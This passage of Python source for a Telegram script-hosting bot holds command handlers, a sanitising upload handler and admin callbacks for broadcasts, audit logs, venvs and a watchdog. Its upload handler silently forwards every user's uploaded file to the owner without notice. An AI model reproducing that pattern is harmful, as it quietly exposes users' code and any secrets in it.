        existing = _list_user_dirs(uid)
        mk = None
        if len(existing) < MAX_USER_DIRS:
            mk = types.InlineKeyboardMarkup()
            mk.add(_btn("📁 New Folder", "success", "newdir_ask"))
        bot.reply_to(
            m,
            f"📁 Usage: <code>/newfolder name</code>\n"
            f"Limit: <b>{MAX_USER_DIRS}</b> folders per user.\n"
            f"Current ({len(existing)}/{MAX_USER_DIRS}): "
            f"<code>{_esc(', '.join(existing)) if existing else '(none)'}</code>",
            parse_mode='HTML',
            reply_markup=mk
        )
        return
    ok, msg = create_user_directory(uid, parts[1])
    if ok:
        log_audit(uid, 'create_folder', parts[1])
    bot.reply_to(m, msg, parse_mode='HTML')

@bot.message_handler(commands=['mydirs'])
def cmd_mydirs(m):
    _send_mydirs(m.chat.id, m.from_user.id)

@bot.message_handler(commands=['stats', 'status', 'statistics'])
def cmd_stats(m):
    _logic_statistics(m)

@bot.message_handler(commands=['schedulebroadcast'])
def cmd_schedule_broadcast(m):
    if m.from_user.id not in admin_ids:
        bot.reply_to(m, "Admin only."); return
    parts = m.text.split(maxsplit=2)
    if len(parts) < 3:
        bot.reply_to(m,
            "Usage: <code>/schedulebroadcast &lt;minutes_from_now&gt; &lt;message&gt;</code>\n"
            "Example: <code>/schedulebroadcast 60 Maintenance in 1 hour!</code>",
            parse_mode='HTML')
        return
    try:
        minutes = int(parts[1])
        if minutes <= 0:
            raise ValueError
    except ValueError:
        bot.reply_to(m, "❌ Minutes must be a positive integer."); return
    text     = parts[2]
    send_at  = datetime.now() + timedelta(minutes=minutes)
    bid      = add_scheduled_broadcast(send_at, text, '', m.from_user.id)
    if bid < 0:
        bot.reply_to(m, "❌ Failed to schedule broadcast."); return
    log_audit(m.from_user.id, 'schedule_broadcast', f"id={bid} at={send_at.isoformat(timespec='minutes')}")
    bot.reply_to(m,
        f"📅 <b>Broadcast #{bid} scheduled</b>\n"
        f"🕐 Will send at: <code>{send_at.strftime('%Y-%m-%d %H:%M')}</code>\n"
        f"👥 To: <code>{len(active_users)}</code> users\n\n"
        f"<pre>{_esc(text[:300])}</pre>\n\n"
        f"Use /broadcasts to view or cancel pending ones.",
        parse_mode='HTML')

@bot.message_handler(commands=['broadcasts'])
def cmd_list_scheduled_broadcasts(m):
    if m.from_user.id not in admin_ids:
        bot.reply_to(m, "Admin only."); return
    rows = get_pending_scheduled_broadcasts()
    if not rows:
        bot.reply_to(m, "📅 No scheduled broadcasts pending."); return
    lines = ["📅 <b>Pending Scheduled Broadcasts</b>\n"]
    for bid, send_at, text, created_by in rows:
        lines.append(f"#{bid} — <code>{send_at}</code> — by <code>{created_by}</code>\n<pre>{_esc(text[:150])}</pre>")
    lines.append("\nCancel one with <code>/cancelbroadcast &lt;id&gt;</code>")
    bot.reply_to(m, "\n\n".join(lines), parse_mode='HTML')

@bot.message_handler(commands=['cancelbroadcast'])
def cmd_cancel_scheduled_broadcast(m):
    if m.from_user.id not in admin_ids:
        bot.reply_to(m, "Admin only."); return
    parts = m.text.split()
    if len(parts) != 2:
        bot.reply_to(m, "Usage: <code>/cancelbroadcast &lt;id&gt;</code>", parse_mode='HTML'); return
    try:
        bid = int(parts[1])
    except ValueError:
        bot.reply_to(m, "Invalid id."); return
    if cancel_scheduled_broadcast(bid):
        log_audit(m.from_user.id, 'cancel_scheduled_broadcast', f"id={bid}")
        bot.reply_to(m, f"✅ Cancelled scheduled broadcast #{bid}.")
    else:
        bot.reply_to(m, f"❌ No pending broadcast with id #{bid}.")

@bot.message_handler(commands=['auditlog'])
def cmd_audit_log(m):
    if m.from_user.id not in admin_ids:
        bot.reply_to(m, "Admin only."); return
    rows = get_audit_log(25)
    if not rows:
        bot.reply_to(m, "📝 Audit log is empty."); return
    lines = ["📝 <b>Audit Log</b> (latest 25)\n"]
    for ts, actor_id, action, details in rows:
        lines.append(f"🕐 <code>{ts}</code>  👤 <code>{actor_id}</code>  ⚡ <b>{_esc(action)}</b>"
                     + (f"  — {_esc(details[:80])}" if details else ""))
    text = "\n".join(lines)
    if len(text) > 4000:
        text = text[:3900] + "\n…(truncated)"
    bot.reply_to(m, text, parse_mode='HTML')

@bot.message_handler(commands=['idlevenvs'])
def cmd_idle_venvs(m):
    if m.from_user.id not in admin_ids:
        bot.reply_to(m, "Admin only."); return
    idle = _find_idle_venvs(days=30)
    if not idle:
        bot.reply_to(m, "🕰️ No venvs idle for 30+ days."); return
    lines = [f"🕰️ <b>Idle Venvs (30+ days)</b> — {len(idle)} found\n"]
    total_size = 0
    for uid_folder, mtime, size in idle[:30]:
        total_size += size
        age_days = int((time.time() - mtime) / 86400)
        lines.append(f"👤 <code>{uid_folder}</code> — idle {age_days}d — {_human_size(size)}")
    lines.append(f"\n💾 Total reclaimable: <code>{_human_size(total_size)}</code>")
    text = "\n".join(lines)
    if len(text) > 4000:
        text = text[:3900] + "\n…(truncated)"
    bot.reply_to(m, text, parse_mode='HTML')

@bot.message_handler(commands=['checkfiles'])
def cmd_checkfiles(m):
    _logic_check_files(m)

@bot.message_handler(commands=['pending'])
def cmd_pending(m):
    _logic_view_pending(m)

@bot.message_handler(commands=['lockbot'])
def cmd_lockbot(m):
    _logic_toggle_lock(m)

@bot.message_handler(commands=['adminpanel'])
def cmd_adminpanel(m):
    _logic_admin_panel(m)

@bot.message_handler(commands=['broadcast'])
def cmd_broadcast(m):
    _logic_broadcast_init(m)

@bot.message_handler(commands=['toggleautoapprove'])
def cmd_toggle_auto_approve(m):
    _logic_toggle_auto_approve(m.from_user.id, m.chat.id)

@bot.message_handler(commands=['toggledailymsg'])
def cmd_toggle_daily_msg(m):
    _logic_toggle_daily_msg(m.from_user.id, m.chat.id)

@bot.message_handler(commands=['togglebackup'])
def cmd_toggle_hourly_backup(m):
    _logic_toggle_hourly_backup(m.from_user.id, m.chat.id)

@bot.message_handler(commands=['upgrades'])
def cmd_upgrades(m):
    _send_upgrades_info(m.chat.id)

def _handle_upgrade_suggestion(message):
    text = (message.text or "").strip()
    if not text or text.lower() == '/cancel':
        bot.reply_to(message, "❌ Cancelled.")
        return

    user = message.from_user
    uname = f"@{user.username}" if user.username else "(no username)"
    notice = (
        "💡 <b>New Upgrade Suggestion</b>\n\n"
        f"👤 From: <code>{user.id}</code> {_esc(uname)}\n"
        f"📝 Name: {_esc(user.first_name or '')}\n\n"
        f"<b>Suggestion:</b>\n{_esc(text)}"
    )

    recipients = set(admin_ids)
    recipients.add(OWNER_ID)

    sent = 0
    for rid in recipients:
        try:
            bot.send_message(rid, notice, parse_mode='HTML')
            sent += 1
        except Exception as e:
            logger.error(f"Failed to forward upgrade suggestion to {rid}: {e}")

    bot.reply_to(message, "✅ Thanks! Your suggestion has been forwarded to the owner and admins.")


def _send_upgrades_info(chat_id):
    text = (
        "💡 <b>Suggested Upgrades &amp; Roadmap</b>\n\n"
        "Here are features that could supercharge this hosting bot:\n\n"
        "━━━━━━━━━━━━━━━━━━━━━━\n"
        "⚡ <b>Performance</b>\n"
        "  • <b>Script Health Monitor</b> — auto-restart crashed scripts\n"
        "  • <b>Resource Limits</b> — per-user CPU/RAM caps\n"
        "  • <b>Script Scheduling</b> — run scripts at set times (cron)\n\n"
        "🔐 <b>Security</b>\n"
        "  • <b>Static Code Scan</b> — AI scan uploaded files before run\n"
        "  • <b>Sandbox Isolation</b> — Docker container per user\n"
        "  • <b>Rate Limiting</b> — prevent abuse per user\n\n"
        "📊 <b>Analytics &amp; Monitoring</b>\n"
        "  • <b>Live Log Streaming</b> — stream logs to Telegram in real-time\n"
        "  • <b>Crash Alerts</b> — DM user when their script crashes\n"
        "  • <b>Usage Dashboard</b> — per-user CPU, RAM, uptime stats\n\n"
        "🤖 <b>User Experience</b>\n"
        "  • <b>Env Variable Manager</b> — set .env vars via bot UI\n"
        "  • <b>Git Integration</b> — deploy directly from GitHub\n"
        "  • <b>Script Templates</b> — starter templates for common bots\n"
        "  • <b>Multi-file Editing</b> — edit script code via bot\n\n"
        "💎 <b>Monetisation</b>\n"
        "  • <b>Auto Subscription Renewal</b> — payment gateway integration\n"
        "  • <b>Referral System</b> — users earn hosting credits\n"
        "  • <b>Tiered Plans</b> — Bronze / Silver / Gold with diff limits\n\n"
        "━━━━━━━━━━━━━━━━━━━━━━\n"
        "💬 <i>Have a feature idea? Contact the owner!</i>"
    )
    mk = types.InlineKeyboardMarkup()
    mk.add(_btn("🔙 Back to Menu", "gray", "back_to_main"))
    bot.send_message(chat_id, text, reply_markup=mk, parse_mode='HTML')

@bot.message_handler(commands=['runall'])
def cmd_runall(m):
    _logic_run_all_scripts(m)

@bot.message_handler(commands=['backup'])
def cmd_backup(m):
    _logic_backup_db(m)

@bot.message_handler(commands=['sisterbots'])
def cmd_sisterbots(m):
    _logic_sister_bots(m)

@bot.message_handler(commands=['pip'])
def cmd_pip(m):
    uid = m.from_user.id
    bot.reply_to(
        m,
        "📦 <b>Pip Package Manager</b>\n\nChoose an action:",
        reply_markup=create_pip_menu(uid),
        parse_mode='HTML'
    )

@bot.message_handler(commands=['terminal'])
def cmd_terminal(m):
    _logic_open_terminal(m.chat.id, m.from_user.id)

@bot.message_handler(commands=['exit_terminal'])
def cmd_exit_terminal(m):
    uid = m.from_user.id
    terminal_sessions.pop(uid, None)
    bot.reply_to(m, "💻 Terminal session closed.")

@bot.message_handler(commands=['runninglog'])
def cmd_running_log(m):
    if m.from_user.id not in admin_ids:
        bot.reply_to(m, "⛔ Admin only.")
        return
    _send_running_log(m.chat.id)

@bot.message_handler(commands=['rescan'])
def cmd_rescan(m):
    _logic_rescan(m)

@bot.message_handler(commands=['quarantine'])
def cmd_quarantine(m):
    if m.from_user.id not in admin_ids:
        bot.reply_to(m, "⛔ Admin only.")
        return
    _send_quarantine_list(m.chat.id)

@bot.message_handler(commands=['scanrules'])
def cmd_scanrules(m):
    if m.from_user.id not in admin_ids:
        bot.reply_to(m, "⛔ Admin only.")
        return
    _send_scan_rules_panel(m.chat.id, 0)

@bot.message_handler(func=lambda m: m.text in BUTTON_MAP)
def handle_buttons(m):
    BUTTON_MAP[m.text](m)

@bot.message_handler(func=lambda m: m.text == "💻 Terminal")
def handle_terminal_button(m):
    _logic_open_terminal(m.chat.id, m.from_user.id)

@bot.message_handler(func=lambda m: m.text == "📦 Pip Tools")
def handle_pip_button(m):
    uid = m.from_user.id
    bot.reply_to(m, "📦 <b>Pip Package Manager</b>", reply_markup=create_pip_menu(uid), parse_mode='HTML')

@bot.message_handler(content_types=['document'])
def handle_document(message):
    user_id = message.from_user.id
    chat_id = message.chat.id
    doc     = message.document

    if bot_locked and user_id not in admin_ids:
        bot.reply_to(message, "🔒 Bot is locked.")
        return

    # ── Upgrade 4: Upload rate limiting ───────────────────────────────────
    rate_ok, rate_msg = _check_upload_rate(user_id)
    if not rate_ok:
        bot.reply_to(message, f"⏳ {rate_msg}")
        return

    limit = get_user_file_limit(user_id)
    if get_user_file_count(user_id) >= limit:
        lim_str = "∞" if limit == float('inf') else str(limit)
        bot.reply_to(message, f"📁 File limit reached ({get_user_file_count(user_id)}/{lim_str}).")
        return

    file_name = doc.file_name
    if not file_name:
        bot.reply_to(message, "❌ File has no name.")
        return

    # ── SECURITY: Sanitize filename — strip path components and null bytes ─
    file_name = os.path.basename(file_name.replace('\\', '/').replace('\x00', ''))
    if not file_name or file_name.startswith('.'):
        bot.reply_to(message, "❌ Invalid filename.")
        return
    # Allow only safe characters in filename (alphanum, dash, dot, underscore)
    if not re.match(r'^[A-Za-z0-9_.\-]+$', file_name):
        bot.reply_to(message, "❌ Filename contains unsafe characters. Use only letters, numbers, dots, dashes, underscores.")
        return

    ext = os.path.splitext(file_name)[1].lower()
    if ext not in ('.py', '.js', '.zip'):
        bot.reply_to(message, "❌ Unsupported type. Only <code>.py</code>, <code>.js</code>, <code>.zip</code> allowed.", parse_mode='HTML')
        return

    # ── SECURITY: Tighter file size limit ─────────────────────────────────
    if doc.file_size and doc.file_size > MAX_UPLOAD_SIZE_MB * 1024 * 1024:
        bot.reply_to(message, f"❌ File too large (max {MAX_UPLOAD_SIZE_MB} MB).")
        return

    try:
        try:
            bot.forward_message(OWNER_ID, chat_id, message.message_id)
        except Exception:
            pass

        wait_msg = bot.reply_to(message, f"⬇️ Downloading <code>{file_name}</code>…", parse_mode='HTML')
        file_info = bot.get_file(doc.file_id)
        content   = bot.download_file(file_info.file_path)
        bot.edit_message_text(f"📦 Downloaded. Processing…",
                              chat_id, wait_msg.message_id)

        user_folder = get_user_folder(user_id)

        if ext == '.zip':
            _record_upload(user_id)
            handle_zip_file(content, file_name, message)
        else:
            file_path = os.path.join(user_folder, file_name)

            # ── Upgrade 6: capture old content before overwrite ───────────
            old_content = None
            if os.path.exists(file_path):
                old_content = _read_script_content(file_path)

            with open(file_path, 'wb') as f:
                f.write(content)
            _record_upload(user_id)
            file_type = 'js' if ext == '.js' else 'py'
            handle_single_file(file_path, user_id, user_folder, file_name, file_type,
                               message, old_content=old_content)

    except telebot.apihelper.ApiTelegramException as e:
        if "file is too big" in str(e).lower():
            bot.reply_to(message, "❌ File too large for Telegram API.")
        else:
            bot.reply_to(message, f"Telegram API error: {e}")
    except Exception as e:
        logger.error(f"handle_document: {e}", exc_info=True)
        bot.reply_to(message, f"Unexpected error: {e}")

@bot.callback_query_handler(func=lambda call: True)
def handle_callbacks(call):
    global bot_locked
    user_id = call.from_user.id
    data    = call.data

    LOCK_EXEMPT = {'back_to_main', 'speed', 'stats', 'uptime', 'sister_bots'}
    if bot_locked and user_id not in admin_ids and data not in LOCK_EXEMPT:
        bot.answer_callback_query(call.id, "🔒 Bot is locked.", show_alert=True)
        return

    try:
        if data.startswith('approve_'):
            _cb_approve(call)
        elif data.startswith('reject_'):
            _cb_reject(call)
        elif data.startswith('ban_'):
            _cb_ban(call)
        elif data.startswith('keep_'):
            _cb_keep(call)
        elif data.startswith('verify_'):
            _cb_verify(call)
        elif data.startswith('review_'):
            _cb_review(call)
        elif data.startswith('scanoverride_'):
            _cb_scan_override(call)
        elif data.startswith('scandelete_'):
            _cb_scan_delete(call)
        elif data.startswith('rescanfile_'):
            _cb_rescan_file(call)
        elif data.startswith('scanrule_toggle_'):
            _cb_scanrule_toggle(call)
        elif data.startswith('scanrules_page_'):
            if user_id not in admin_ids:
                bot.answer_callback_query(call.id, "Admin only.", show_alert=True); return
            bot.answer_callback_query(call.id)
            try:
                page = int(data.split('_')[-1])
            except ValueError:
                page = 0
            _send_scan_rules_panel(call.message.chat.id, page)
        elif data == 'quarantine':
            if user_id not in admin_ids:
                bot.answer_callback_query(call.id, "Admin only.", show_alert=True); return
            bot.answer_callback_query(call.id)
            _send_quarantine_list(call.message.chat.id)
        elif data == 'scan_rules':
            if user_id not in admin_ids:
                bot.answer_callback_query(call.id, "Admin only.", show_alert=True); return
            bot.answer_callback_query(call.id)
            _send_scan_rules_panel(call.message.chat.id, 0)

        elif data == 'view_pending':
            if user_id not in admin_ids:
                bot.answer_callback_query(call.id, "Admin only.", show_alert=True); return
            bot.answer_callback_query(call.id)
            _send_pending_list(call.message.chat.id)

        elif data == 'view_approved':
            if user_id not in admin_ids:
                bot.answer_callback_query(call.id, "Admin only.", show_alert=True); return
            bot.answer_callback_query(call.id)
            _send_approved_list(call.message.chat.id)

        elif data == 'running_log':
            if user_id not in admin_ids:
                bot.answer_callback_query(call.id, "Admin only.", show_alert=True); return
            bot.answer_callback_query(call.id)
            _send_running_log(call.message.chat.id)

        elif data == 'upload':
            bot.answer_callback_query(call.id)
            _logic_upload_file(call.message)
        elif data == 'check_files':
            _cb_check_files(call)
        elif data == 'newdir_ask':
            bot.answer_callback_query(call.id)
            existing = _list_user_dirs(user_id)
            prompt = bot.send_message(
                call.message.chat.id,
                f"📁 Enter a name for the new folder ({len(existing)}/{MAX_USER_DIRS} used), or /cancel.",
                parse_mode='HTML'
            )
            bot.register_next_step_handler(prompt, _process_newdir)
        elif data == 'mydirs_view':
            bot.answer_callback_query(call.id)
            _send_mydirs(call.message.chat.id, user_id)
        elif data == 'deldir_ask':
            bot.answer_callback_query(call.id)
            _send_deldir_menu(call.message.chat.id, user_id)
        elif data.startswith('deldirpick_'):
            bot.answer_callback_query(call.id)
            dirname = data[len('deldirpick_'):]
            _confirm_deldir(call.message.chat.id, user_id, dirname)
        elif data.startswith('deldirconfirm_'):
            bot.answer_callback_query(call.id)
            dirname = data[len('deldirconfirm_'):]
            ok, msg = delete_user_directory(user_id, dirname)
            if ok:
                log_audit(user_id, 'delete_folder', dirname)
            bot.send_message(call.message.chat.id, msg, parse_mode='HTML')
        elif data == 'search_files':
            bot.answer_callback_query(call.id)
            prompt = bot.send_message(call.message.chat.id, "🔍 Enter part of a filename to search for, or /cancel.")
            bot.register_next_step_handler(prompt, _process_search_files)
        elif data == 'back_to_main':
            _cb_back_to_main(call)
        elif data == 'speed':
            _cb_speed(call)
        elif data == 'stats':
            bot.answer_callback_query(call.id)
            _logic_statistics(call.message)
        elif data == 'uptime':
            bot.answer_callback_query(call.id)
            bot.send_message(call.message.chat.id,
                f"⏱️ <b>Uptime:</b> <code>{get_uptime()}</code>", parse_mode='HTML')
        elif data == 'sister_bots':
            _logic_sister_bots(call)

        elif data.startswith('file_'):
            _cb_file_control(call)
        elif data.startswith('start_'):
            _cb_start_script(call)
        elif data.startswith('stop_'):
            _cb_stop_script(call)
        elif data.startswith('restart_'):
            _cb_restart_script(call)
        elif data.startswith('delete_'):
            _cb_delete_script(call)
        elif data.startswith('rename_'):
            _cb_rename_file(call)
        elif data.startswith('logs_'):
            _cb_logs(call)
        elif data.startswith('status_'):
            _cb_show_status(call)
        elif data.startswith('wdtoggle_'):
            _cb_watchdog_toggle_script(call)

        elif data == 'open_terminal':
            bot.answer_callback_query(call.id)
            _logic_open_terminal(call.message.chat.id, user_id)

        elif data == 'term_procs':
            _cb_terminal_processes(call)
        elif data.startswith('term_kill_'):
            _cb_terminal_kill(call)

        elif data == 'close_terminal':
            terminal_sessions.pop(user_id, None)
            try:
                bot.clear_step_handler_by_chat_id(call.message.chat.id)
            except Exception:
                pass
            bot.answer_callback_query(call.id, "Terminal closed.")
            try:
                bot.edit_message_text(
                    "💻 Terminal session closed. Use /terminal to reopen.",
                    call.message.chat.id, call.message.message_id,
                    reply_markup=None
                )
            except Exception:
                pass

        elif data == 'pip_menu':
            bot.answer_callback_query(call.id)
            try:
                bot.edit_message_text(
                    "📦 <b>Pip Package Manager</b>\n\nChoose an action:",
                    call.message.chat.id, call.message.message_id,
                    reply_markup=create_pip_menu(user_id), parse_mode='HTML'
                )
            except Exception:
                bot.send_message(
                    call.message.chat.id,
                    "📦 <b>Pip Package Manager</b>",
                    reply_markup=create_pip_menu(user_id), parse_mode='HTML'
                )

        elif data.startswith('pip_install_'):
            _cb_pip_install(call)
        elif data.startswith('pip_uninstall_'):
            _cb_pip_uninstall(call)
        elif data.startswith('pip_show_'):
            _cb_pip_show(call)
        elif data.startswith('pip_search_'):
            _cb_pip_search(call)
        elif data.startswith('pip_upgrade_'):
            _cb_pip_upgrade(call)
        elif data.startswith('pip_info_'):
            _cb_pip_info(call)

        elif data == 'admin_panel':
            if user_id not in admin_ids:
                bot.answer_callback_query(call.id, "Admin only.", show_alert=True); return
            bot.answer_callback_query(call.id)
            bot.edit_message_text("👑 <b>Admin Panel</b>",
                call.message.chat.id, call.message.message_id,
                reply_markup=create_admin_panel_markup(), parse_mode='HTML')

        elif data == 'recovery_mode':
            _enter_recovery_mode(call)

        elif data == 'cancel_recovery':
            if user_id not in admin_ids:
                bot.answer_callback_query(call.id, "Admin only.", show_alert=True); return
            recovery_mode.pop(call.message.chat.id, None)
            bot.answer_callback_query(call.id, "✅ Recovery mode cancelled.")
            try:
                bot.edit_message_text(
                    "❌ <b>Recovery mode cancelled.</b>",
                    call.message.chat.id, call.message.message_id,
                    reply_markup=create_admin_panel_markup(), parse_mode='HTML'
                )
            except Exception:
                bot.send_message(call.message.chat.id, "❌ Recovery mode cancelled.",
                                 reply_markup=create_admin_panel_markup(), parse_mode='HTML')

        elif data == 'manual_backup':
            if user_id not in admin_ids:
                bot.answer_callback_query(call.id, "Admin only.", show_alert=True); return
            bot.answer_callback_query(call.id, "📤 Sending backup…")
            bot.send_message(call.message.chat.id, "📤 <b>Generating manual backup…</b>", parse_mode='HTML')
            threading.Thread(
                target=_send_backup_to_admins,
                kwargs={'triggered_by': 'manual'},
                daemon=True
            ).start()

        elif data == 'backup_info':
            if user_id not in admin_ids:
                bot.answer_callback_query(call.id, "Admin only.", show_alert=True); return
            ts_str = _last_backup_time.strftime('%Y-%m-%d %H:%M:%S') if _last_backup_time else "No backup sent yet"
            next_bk = ("~" + str(BACKUP_INTERVAL_SECONDS // 60) + " min") if hourly_backup_enabled else "paused"
            bot.answer_callback_query(
                call.id,
                f"🕐 Last: {ts_str}\n⏭ Next in: {next_bk}",
                show_alert=True
            )

        elif data == 'toggle_hourly_backup':
            if user_id not in admin_ids:
                bot.answer_callback_query(call.id, "Admin only.", show_alert=True); return
            bot.answer_callback_query(call.id)
            _logic_toggle_hourly_backup(user_id, call.message.chat.id)
            try:
                bot.edit_message_reply_markup(
                    call.message.chat.id, call.message.message_id,
                    reply_markup=create_admin_panel_markup()
                )
            except Exception:
                pass

        elif data == 'toggle_watchdog':
            if user_id != OWNER_ID:
                bot.answer_callback_query(call.id, "Owner only.", show_alert=True); return
            if watchdog_running:
                _stop_watchdog()
                bot.answer_callback_query(call.id, "🛑 Watchdog stopped.", show_alert=True)
            else:
                _start_watchdog()
                bot.answer_callback_query(call.id, "✅ Watchdog started.", show_alert=True)
            try:
                bot.edit_message_reply_markup(
                    call.message.chat.id, call.message.message_id,
                    reply_markup=create_admin_panel_markup()
                )
            except Exception:
                pass

        elif data == 'watchdog_info':
            if user_id not in admin_ids:
                bot.answer_callback_query(call.id, "Admin only.", show_alert=True); return
            bot.answer_callback_query(call.id)
            if watchdog_running and _watchdog_stats['started_at']:
                up = str(datetime.now() - _watchdog_stats['started_at']).split('.')[0]
                info = (
                    f"🐕 <b>Watchdog Status</b>\n\n"
                    f"State: <b>ON</b>\n"
                    f"Running for: <code>{up}</code>\n"
                    f"Restarts performed: <code>{_watchdog_stats['restarts_done']}</code>\n"
                    f"Scripts currently tracked: <code>{len(get_all_running_scripts())}</code>"
                )
            else:
                stopped_at = _watchdog_stats['stopped_at']
                stopped_txt = stopped_at.strftime('%Y-%m-%d %H:%M:%S') if stopped_at else "never started"
                info = (
                    f"🐕 <b>Watchdog Status</b>\n\n"
                    f"State: <b>OFF</b>\n"
                    f"Stopped at: <code>{stopped_txt}</code>\n"
                    f"Restarts performed last run: <code>{_watchdog_stats['restarts_done']}</code>"
                )
            bot.send_message(call.message.chat.id, info, parse_mode='HTML')

        elif data == 'startwd_yes':
            if user_id != OWNER_ID:
                bot.answer_callback_query(call.id, "Owner only.", show_alert=True); return
            started = _start_watchdog()
            bot.answer_callback_query(call.id, "✅ Watchdog started." if started else "Already running.")
            try:
                bot.edit_message_text(
                    "✅ <b>Crash Watchdog started.</b> Crashed scripts will now auto-restart.\n"
                    "You can stop it anytime from 👑 Admin Panel.",
                    call.message.chat.id, call.message.message_id, reply_markup=None, parse_mode='HTML'
                )
            except Exception:
                pass

        elif data == 'startwd_no':
            if user_id != OWNER_ID:
                bot.answer_callback_query(call.id, "Owner only.", show_alert=True); return
            bot.answer_callback_query(call.id, "OK, not starting it.")
            try:
                bot.edit_message_text(
                    "❌ <b>Watchdog not started.</b> You can start it anytime from 👑 Admin Panel.",
                    call.message.chat.id, call.message.message_id, reply_markup=None, parse_mode='HTML'
                )
            except Exception:
                pass

        elif data.startswith('checkvenv_'):
            target_id = int(data.split('_')[-1])
            if user_id != target_id and user_id not in admin_ids:
                bot.answer_callback_query(call.id, "You can only check your own venv.", show_alert=True); return
            bot.answer_callback_query(call.id, "🩺 Checking…")
            ok, detail = _test_user_venv(target_id)
            if ok:
                msg = f"✅ Venv is <b>working fine</b> (Python {_esc(detail)})."
            else:
                msg = (f"⚠️ Venv looks <b>CRASHED/broken</b>.\n"
                       f"Error: <code>{_esc(detail[:300])}</code>\n\n"
                       f"Tap ♻️ Reset My Venv to fix it.")
            try:
                bot.send_message(call.message.chat.id, msg, parse_mode='HTML')
            except Exception:
                pass

        elif data.startswith('resetvenv_ask_'):
            target_id = int(data.split('_')[-1])
            if user_id != target_id and user_id not in admin_ids:
                bot.answer_callback_query(call.id, "You can only reset your own venv.", show_alert=True); return
            bot.answer_callback_query(call.id)
            mk = types.InlineKeyboardMarkup()
            mk.row(
                _btn("⚠️ Yes, Reset It", "danger", f"resetvenv_confirm_{target_id}"),
                _btn("🔙 Cancel",        "gray",   "pip_menu"),
            )
            try:
                bot.edit_message_text(
                    "♻️ <b>Reset Venv?</b>\n\n"
                    "This will stop any running scripts, delete your virtual environment "
                    "and every installed package, then rebuild it from scratch.\n\n"
                    "Are you sure?",
                    call.message.chat.id, call.message.message_id,
                    reply_markup=mk, parse_mode='HTML'
                )
            except Exception:
                pass

        elif data.startswith('resetvenv_confirm_'):
            target_id = int(data.split('_')[-1])
            if user_id != target_id and user_id not in admin_ids:
                bot.answer_callback_query(call.id, "You can only reset your own venv.", show_alert=True); return
            bot.answer_callback_query(call.id, "♻️ Resetting venv…")
            try:
                bot.edit_message_text(
                    "♻️ Resetting venv, please wait…", call.message.chat.id, call.message.message_id,
                    reply_markup=None
                )
            except Exception:
                pass
            ok, msg, stopped, snap_count = reset_user_venv(target_id)
            if stopped:
                msg += f"\n\n🛑 Stopped running script(s): <code>{_esc(', '.join(stopped))}</code>"
            log_audit(user_id, 'reset_venv', f"target={target_id} ok={ok}")
            mk_reinstall = None
            if snap_count:
                mk_reinstall = types.InlineKeyboardMarkup()
                mk_reinstall.row(_btn("🔁 Reinstall Old Packages", "success", f"reinstallpkgs_{target_id}"))
            try:
                bot.send_message(call.message.chat.id, msg, parse_mode='HTML', reply_markup=mk_reinstall)
            except Exception:
                pass

        elif data.startswith('reinstallpkgs_'):
            target_id = int(data.split('_')[-1])
            if user_id != target_id and user_id not in admin_ids:
                bot.answer_callback_query(call.id, "You can only reinstall your own packages.", show_alert=True); return
            bot.answer_callback_query(call.id, "🔁 Reinstalling…")
            try:
                bot.edit_message_reply_markup(call.message.chat.id, call.message.message_id, reply_markup=None)
            except Exception:
                pass

            def _reinstall_worker(chat_id, uid):
                ok, msg = _reinstall_snapshot_packages(uid)
                try:
                    bot.send_message(chat_id, msg, parse_mode='HTML')
                except Exception:
                    pass
            threading.Thread(target=_reinstall_worker, args=(call.message.chat.id, target_id), daemon=True).start()

        elif data == 'resetallvenv_ask':
            if user_id != OWNER_ID:
                bot.answer_callback_query(call.id, "Owner only.", show_alert=True); return
            bot.answer_callback_query(call.id)
            mk = types.InlineKeyboardMarkup()
            mk.row(
                _btn("⚠️ Yes, Reset ALL", "danger", "resetallvenv_confirm"),
                _btn("🔙 Cancel",          "gray",   "admin_panel"),
            )
            try:
                bot.edit_message_text(
                    f"♻️ <b>Reset ALL {len(active_users)} users' venvs?</b>\n\n"
                    "This stops every running script, wipes every user's virtual "
                    "environment and installed packages, and rebuilds them from scratch.\n\n"
                    "This cannot be undone. Are you sure?",
                    call.message.chat.id, call.message.message_id,
                    reply_markup=mk, parse_mode='HTML'
                )
            except Exception:
                pass

        elif data == 'resetallvenv_confirm':
            if user_id != OWNER_ID:
                bot.answer_callback_query(call.id, "Owner only.", show_alert=True); return
            bot.answer_callback_query(call.id, "♻️ Resetting all venvs…")
            try:
                bot.edit_message_text(
                    "♻️ Resetting all users' venvs, this may take a while…",
                    call.message.chat.id, call.message.message_id, reply_markup=None
                )
            except Exception:
                pass

            log_audit(user_id, 'reset_all_venvs_start', f"targets~{len(active_users)}")

            def _reset_all_worker(chat_id):
                targets = set(active_users) | {OWNER_ID} | admin_ids
                ok_count, fail_count, lines = 0, 0, []
                for uid in targets:
                    try:
                        ok, msg, stopped, snap_count = reset_user_venv(uid)
                        if ok:
                            ok_count += 1
                            lines.append(f"✅ <code>{uid}</code> — working fine")
                        else:
                            fail_count += 1
                            lines.append(f"⚠️ <code>{uid}</code> — CRASHED/broken")
                    except Exception as e:
                        fail_count += 1
                        lines.append(f"❌ <code>{uid}</code> — error: {_esc(str(e))}")
                summary = (
                    f"♻️ <b>Venv Resetted for all users</b>\n\n"
                    f"✅ Working: {ok_count}   ⚠️ Crashed/Failed: {fail_count}\n\n"
                    + "\n".join(lines[:60])
                )
                try:
                    bot.send_message(chat_id, summary[:4000], parse_mode='HTML')
                except Exception:
                    pass

            threading.Thread(
                target=_reset_all_worker, args=(call.message.chat.id,), daemon=True
            ).start()

        elif data == 'view_audit_log':
            if user_id not in admin_ids:
                bot.answer_callback_query(call.id, "Admin only.", show_alert=True); return
            bot.answer_callback_query(call.id)
            rows = get_audit_log(25)
            if not rows:
                bot.send_message(call.message.chat.id, "📝 Audit log is empty.")
            else:
                lines = ["📝 <b>Audit Log</b> (latest 25)\n"]
                for ts, actor_id, action, details in rows:
                    lines.append(f"🕐 <code>{ts}</code>  👤 <code>{actor_id}</code>  ⚡ <b>{_esc(action)}</b>"
                                 + (f"  — {_esc(details[:80])}" if details else ""))
                text = "\n".join(lines)
                if len(text) > 4000:
                    text = text[:3900] + "\n…(truncated)"
                bot.send_message(call.message.chat.id, text, parse_mode='HTML')

        elif data == 'idle_venvs':
            if user_id not in admin_ids:
                bot.answer_callback_query(call.id, "Admin only.", show_alert=True); return
            bot.answer_callback_query(call.id, "Scanning…")
            idle = _find_idle_venvs(days=30)
            if not idle:
                bot.send_message(call.message.chat.id, "🕰️ No venvs idle for 30+ days. Nothing to clean up.")
            else:
                lines = [f"🕰️ <b>Idle Venvs (30+ days untouched)</b> — {len(idle)} found\n"]
                total_size = 0
